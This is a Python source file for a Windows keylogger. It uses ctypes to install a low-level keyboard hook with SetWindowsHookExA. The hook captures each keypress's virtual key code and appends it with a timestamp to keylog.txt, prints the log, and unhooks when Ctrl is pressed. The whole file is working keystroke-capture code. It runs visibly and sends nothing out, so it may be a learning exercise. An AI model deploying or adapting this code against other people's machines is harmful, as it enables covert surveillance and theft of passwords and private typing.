import sys
import struct
import os
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import datetime

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN= 0x0100
CTRL_CODE = 162

class KeyLogger:
    def __init__(self):
        self.IUser32 =user32
        self.hooked = None

    def installHookProc(self,pointer):
        self.hooked = self.IUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0

        )
        if not self.hooked:
            print ("install Failed")
            return False
        return True
    def uninstallHookproc(self):
        if self.hooked is None:
            return
        self.IUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)
def hookProc(nCode, wParam, lParam):
    global keyLogger
    KBDLLHOOKSTRUCT=struct.Struct('5i')
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked, nCode,wParam,lParam)
    by =string_at(lParam,KBDLLHOOKSTRUCT.size)
    vkCode, scanCode, flag, time, dwExtraInfo = KBDLLHOOKSTRUCT.unpack(by)
    hookedKey = chr(vkCode).encode("utf8")
    a = open("keylog.txt", "ab")
    today = str(datetime.datetime.now().time())
    to = today.encode()
    a.write(to)
    a.write(hookedKey)
    con = "\\"
    con2 = con.encode()
    a.write(con2)
    a.close()
    a = open("keylog.txt", "r")
    lines = a.readlines()
    for line in lines:
        print(line)
    a.close()
    print(hookedKey)
    if(CTRL_CODE == int(vkCode)):
        print("Ctrl pressed, call uninstallHook()")
        keyLogger.uninstallHookproc()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0,0,0)

keyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if keyLogger.installHookProc(pointer):
    print("installed keyLoger")
startKeyLog()
